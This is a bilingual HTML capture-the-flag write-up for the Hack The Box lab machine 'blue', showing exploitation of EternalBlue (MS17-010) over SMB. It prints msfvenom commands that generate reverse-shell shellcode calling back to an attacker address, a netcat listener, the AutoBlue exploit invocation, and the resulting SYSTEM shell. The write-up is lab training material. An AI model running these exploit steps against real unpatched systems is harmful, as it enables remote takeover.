@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>blue | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">blue</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <!-- ENGLISH CONTENT -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> This Windows machine is straightforward as it is vulnerable to EternalBlue (MS17-010), the infamous vulnerability discovered by the NSA and later weaponized by Russia in the devastating WannaCry and NotPetya attacks. The vulnerability resides in the SMB service running on port 445.</p>
+                    <p>The flaw consists of a buffer overflow triggered when processing an <code>SMB_COM_TRANSACTION2</code> request. The service miscalculates the amount of data copied into memory, and by abusing this overflow, an attacker can achieve remote code execution with SYSTEM-level privileges. Since the exploit grants immediate administrator access, no privilege escalation step was necessary.</p>
+                    <p>Using the <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">AutoBlue-MS17-010</a> repository, I compiled a stageless reverse shell shellcode with <code>msfvenom</code>, launched the exploit against the target, and obtained a shell as <code>nt authority\system</code> directly.</p>
+                    <p><strong>Technologies/Exploits:</strong> EternalBlue (MS17-010), SMBv1 buffer overflow (CVE-2017-0143), AutoBlue-MS17-010, msfvenom shellcode generation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an <code>nmap</code> scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image1.png" alt="Nmap scan results showing open ports on the Windows target, including SMB on port 445" /></p>
+
+                <p>The scan reveals several services typical of a Windows 7 machine. Most importantly, port <code>445</code> is open, running the SMB service. This is significant because SMBv1 on unpatched Windows 7 systems is the primary attack surface for EternalBlue.</p>
+
+                <h2>Vulnerability Background - EternalBlue (MS17-010)</h2>
+                <p>This machine is vulnerable to <strong>EternalBlue</strong>, one of the most notorious vulnerabilities in cybersecurity history. Originally discovered and stockpiled by the NSA, it was leaked by the Shadow Brokers group in April 2017. It was subsequently used in the WannaCry ransomware attack and the destructive NotPetya campaign.</p>
+
+                <p>The vulnerability is a <strong>buffer overflow in the SMBv1 protocol</strong> (port 445). Specifically, when the server processes an <code>SMB_COM_TRANSACTION2</code> request, it miscalculates the size of data being copied into a kernel buffer. By carefully crafting this request, an attacker can overflow the buffer and execute arbitrary code at the kernel level, which means running commands as <code>nt authority\system</code> — the highest privilege level on Windows.</p>
+
+                <h2>Vulnerability Verification</h2>
+                <p>Before attempting exploitation, I verify that the target is indeed vulnerable using two different methods. First, with an <code>nmap</code> NSE script specifically designed to check for MS17-010:</p>
+                <pre><code class="language-bash">nmap -p445 --script smb-vuln-ms17-010 10.129.2.139</code></pre>
+
+                <p>The script output confirms the vulnerability:</p>
+                <pre><code class="language-plaintext">Nmap scan report for 10.129.2.139
+Host is up (0.041s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|       servers (ms17-010).
+|
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</code></pre>
+
+                <p>Additionally, I use the checker script from the <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">AutoBlue-MS17-010</a> repository for a second confirmation:</p>
+                <pre><code class="language-bash">python3 eternal_checker.py 10.129.2.139</code></pre>
+                <pre><code class="language-plaintext">[*] Target OS: Windows 7 Professional 7601 Service Pack 1
+[!] The target is not patched
+=== Testing named pipes ===
+[*] Done</code></pre>
+
+                <p>Both methods confirm the target is running <strong>Windows 7 Professional SP1</strong> and is <strong>not patched</strong> against MS17-010. The target is ready for exploitation.</p>
+
+                <h2>Exploitation - EternalBlue (MS17-010)</h2>
+                <p>There is a well-known repository for exploiting this vulnerability without relying on Metasploit's framework modules: <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a>. This tool provides scripts for both checking and exploiting the vulnerability.</p>
+
+                <h3>Shellcode Preparation</h3>
+                <p>Before running the exploit, I need to compile a shellcode payload. The repository includes a helper script called <code>shell_prep.sh</code> that uses <code>msfvenom</code> to generate the reverse shell payload. I run it and configure the options:</p>
+                <pre><code class="language-bash">./shell_prep.sh</code></pre>
+                <pre><code class="language-plaintext">                                 _.-;;-._
+                          '-..-'|   ||   |
+                          '-..-'|_.-;;-._|
+                          '-..-'|   ||   |
+                          '-..-'|_.-''-._|
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+Y
+LHOST for reverse connection:
+10.10.14.195
+LPORT you want x64 to listen on:
+443
+LPORT you want x86 to listen on:
+443
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+1
+Generating x64 cmd shell (stageless)...
+
+msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.195 LPORT=443
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Saved as: sc_x64_msf.bin
+
+Generating x86 cmd shell (stageless)...
+
+msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.195 LPORT=443
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Saved as: sc_x86_msf.bin
+
+MERGING SHELLCODE WOOOO!!!
+DONE</code></pre>
+
+                <p>I chose a <strong>stageless</strong> regular <code>cmd</code> shell (option 1 for both prompts) rather than a meterpreter session. The script generates shellcode for both x64 and x86 architectures and merges them into a single binary that the exploit will inject into the target.</p>
+
+                <h3>Launching the Exploit</h3>
+                <p>With the shellcode ready, I set up a <code>netcat</code> listener on port 443 to catch the reverse shell, and then execute the exploit pointing to the x64 shellcode binary:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+                <pre><code class="language-bash">python3 eternalblue_exploit7.py 10.129.2.139 shellcode/sc_x64.bin</code></pre>
+
+                <p>The exploit output shows the exploitation process:</p>
+                <pre><code class="language-plaintext">shellcode size: 1232
+numGroomConn: 13
+Target OS: Windows 7 Professional 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+done</code></pre>
+
+                <p>The <code>INVALID_PARAMETER</code> response and <code>done</code> message indicate the exploit executed successfully. On the listener side, the reverse shell connects back:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.14.195] from (UNKNOWN) [10.129.2.139] 49158
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system</code></pre>
+
+                <p>I have obtained a shell as <code>nt authority\system</code>, which is the highest privilege level on a Windows system. Since this exploit targets a kernel-level vulnerability, it grants SYSTEM access directly — <strong>no privilege escalation is necessary</strong>. Both the user and root flags can be retrieved immediately.</p>
+            </div>
+
+            <!-- SPANISH CONTENT -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> Esta máquina Windows es bastante directa, ya que es vulnerable a EternalBlue (MS17-010), la famosa vulnerabilidad descubierta por la NSA y posteriormente utilizada por Rusia en los devastadores ataques de WannaCry y NotPetya. La vulnerabilidad reside en el servicio SMB que corre en el puerto 445.</p>
+                    <p>El fallo consiste en un buffer overflow que se desencadena al procesar una petición <code>SMB_COM_TRANSACTION2</code>. El servicio calcula mal la cantidad de datos copiados en memoria, y abusando de este overflow, un atacante puede lograr ejecución remota de código con privilegios de SYSTEM. Como el exploit otorga acceso de administrador directamente, no fue necesario ningún paso de escalada de privilegios.</p>
+                    <p>Utilizando el repositorio <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">AutoBlue-MS17-010</a>, compilé un shellcode de reverse shell stageless con <code>msfvenom</code>, lancé el exploit contra el objetivo y obtuve una shell como <code>nt authority\system</code> directamente.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> EternalBlue (MS17-010), buffer overflow en SMBv1 (CVE-2017-0143), AutoBlue-MS17-010, generación de shellcode con msfvenom.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar puertos abiertos y servicios que se ejecutan en la máquina objetivo:</p>
+                <p><img src="./media/image1.png" alt="Resultados del escaneo nmap mostrando puertos abiertos en el objetivo Windows, incluyendo SMB en el puerto 445" /></p>
+
+                <p>El escaneo revela varios servicios típicos de una máquina Windows 7. Lo más importante es que el puerto <code>445</code> está abierto, ejecutando el servicio SMB. Esto es significativo porque SMBv1 en sistemas Windows 7 sin parchear es la superficie de ataque principal para EternalBlue.</p>
+
+                <h2>Contexto de la Vulnerabilidad - EternalBlue (MS17-010)</h2>
+                <p>Esta máquina es vulnerable a <strong>EternalBlue</strong>, una de las vulnerabilidades más notorias en la historia de la ciberseguridad. Originalmente descubierta y almacenada por la NSA, fue filtrada por el grupo Shadow Brokers en abril de 2017. Posteriormente fue utilizada en el ataque de ransomware WannaCry y en la destructiva campaña NotPetya.</p>
+
+                <p>La vulnerabilidad es un <strong>buffer overflow en el protocolo SMBv1</strong> (puerto 445). En concreto, cuando el servidor procesa una petición <code>SMB_COM_TRANSACTION2</code>, calcula mal el tamaño de los datos que se copian en un buffer del kernel. Manipulando cuidadosamente esta petición, un atacante puede desbordar el buffer y ejecutar código arbitrario a nivel de kernel, lo que significa ejecutar comandos como <code>nt authority\system</code>, el nivel de privilegio más alto en Windows.</p>
+
+                <h2>Verificación de la Vulnerabilidad</h2>
+                <p>Antes de intentar la explotación, verifico que el objetivo es efectivamente vulnerable utilizando dos métodos distintos. Primero, con un script NSE de <code>nmap</code> diseñado específicamente para comprobar MS17-010:</p>
+                <pre><code class="language-bash">nmap -p445 --script smb-vuln-ms17-010 10.129.2.139</code></pre>
+
+                <p>La salida del script confirma la vulnerabilidad:</p>
+                <pre><code class="language-plaintext">Nmap scan report for 10.129.2.139
+Host is up (0.041s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|       servers (ms17-010).
+|
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</code></pre>
+
+                <p>Además, utilizo el script de comprobación del repositorio <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">AutoBlue-MS17-010</a> como segunda confirmación:</p>
+                <pre><code class="language-bash">python3 eternal_checker.py 10.129.2.139</code></pre>
+                <pre><code class="language-plaintext">[*] Target OS: Windows 7 Professional 7601 Service Pack 1
+[!] The target is not patched
+=== Testing named pipes ===
+[*] Done</code></pre>
+
+                <p>Ambos métodos confirman que el objetivo ejecuta <strong>Windows 7 Professional SP1</strong> y que <strong>no está parcheado</strong> contra MS17-010. El objetivo está listo para la explotación.</p>
+
+                <h2>Explotación - EternalBlue (MS17-010)</h2>
+                <p>Existe un repositorio muy conocido para explotar esta vulnerabilidad sin depender de los módulos del framework de Metasploit: <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a>. Esta herramienta proporciona scripts tanto para comprobar como para explotar la vulnerabilidad.</p>
+
+                <h3>Preparación del Shellcode</h3>
+                <p>Antes de ejecutar el exploit, necesito compilar un payload de shellcode. El repositorio incluye un script auxiliar llamado <code>shell_prep.sh</code> que utiliza <code>msfvenom</code> para generar el payload de reverse shell. Lo ejecuto y configuro las opciones:</p>
+                <pre><code class="language-bash">./shell_prep.sh</code></pre>
+                <pre><code class="language-plaintext">                                 _.-;;-._
+                          '-..-'|   ||   |
+                          '-..-'|_.-;;-._|
+                          '-..-'|   ||   |
+                          '-..-'|_.-''-._|
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+Y
+LHOST for reverse connection:
+10.10.14.195
+LPORT you want x64 to listen on:
+443
+LPORT you want x86 to listen on:
+443
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+1
+Generating x64 cmd shell (stageless)...
+
+msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.195 LPORT=443
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Saved as: sc_x64_msf.bin
+
+Generating x86 cmd shell (stageless)...
+
+msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.195 LPORT=443
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Saved as: sc_x86_msf.bin
+
+MERGING SHELLCODE WOOOO!!!
+DONE</code></pre>
+
+                <p>Elijo una shell <code>cmd</code> regular <strong>stageless</strong> (opción 1 en ambos prompts) en lugar de una sesión de meterpreter. El script genera shellcode para ambas arquitecturas x64 y x86 y las fusiona en un único binario que el exploit inyectará en el objetivo.</p>
+
+                <h3>Lanzamiento del Exploit</h3>
+                <p>Con el shellcode preparado, configuro un listener de <code>netcat</code> en el puerto 443 para capturar la reverse shell, y después ejecuto el exploit apuntando al binario de shellcode x64:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+                <pre><code class="language-bash">python3 eternalblue_exploit7.py 10.129.2.139 shellcode/sc_x64.bin</code></pre>
+
+                <p>La salida del exploit muestra el proceso de explotación:</p>
+                <pre><code class="language-plaintext">shellcode size: 1232
+numGroomConn: 13
+Target OS: Windows 7 Professional 7601 Service Pack 1
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+done</code></pre>
+
+                <p>La respuesta <code>INVALID_PARAMETER</code> y el mensaje <code>done</code> indican que el exploit se ha ejecutado correctamente. En el lado del listener, la reverse shell conecta de vuelta:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.14.195] from (UNKNOWN) [10.129.2.139] 49158
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system</code></pre>
+
+                <p>He obtenido una shell como <code>nt authority\system</code>, que es el nivel de privilegio más alto en un sistema Windows. Como este exploit ataca una vulnerabilidad a nivel de kernel, otorga acceso SYSTEM directamente — <strong>no es necesaria ninguna escalada de privilegios</strong>. Ambas flags, de usuario y de root, se pueden recuperar inmediatamente.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
